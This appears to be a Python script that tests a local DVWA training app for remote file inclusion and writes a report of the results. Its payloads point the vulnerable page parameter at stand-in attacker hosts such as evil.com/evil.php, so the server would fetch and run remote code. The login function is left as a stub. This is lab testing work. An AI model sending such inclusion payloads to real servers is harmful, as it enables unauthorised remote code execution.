import requests

# Configuration
DVWA_URL = 'http://localhost/dvwa/'
VULN_URL = 'http://localhost/dvwa/vulnerabilities/fi/?page=http://'
REPORT_FILE = 'fileinclusionreport.txt'

# Function to perform file inclusion and retrieve data
def perform_file_inclusion(session, payload):
    target_url = f'{VULN_URL}{payload}'
    response = session.get(target_url)
    return target_url, response.text

# Function to login to DVWA and retrieve CSRF token
def login_to_dvwa():
    # ... (same as before)

# Function to write report
def write_report(results):
    with open(REPORT_FILE, 'w') as report_file:
        report_file.write('DVWA File Inclusion Vulnerability Report\n')
        report_file.write('='*40 + '\n')

        for payload, (target_url, response_text) in results.items():
            report_file.write(f'Test Payload: {payload}\n')
            report_file.write(f'Target URL: {target_url}\n\n')

            if 'Warning: include' in response_text:
                report_file.write('File inclusion vulnerability detected!\n')
            else:
                report_file.write('No file inclusion vulnerability detected.\n')

            report_file.write('='*40 + '\n\n')

# Main function to run the file inclusion tests
def run_file_inclusion_tests():
    session = login_to_dvwa()

    if not session:
        return

    results = {}

    # File Inclusion payloads
    payloads = [
        'example.com/malicious.php',
        'evil.com/evil.php',
        'badguy.net/bad.php'
    ]

    for payload in payloads:
        target_url, response_text = perform_file_inclusion(session, payload)
        results[payload] = (target_url, response_text)

    session.close()
    write_report(results)
    print(f'Report generated: {REPORT_FILE}')

# Entry point of the script
if __name__ == '__main__':
    run_file_inclusion_tests()
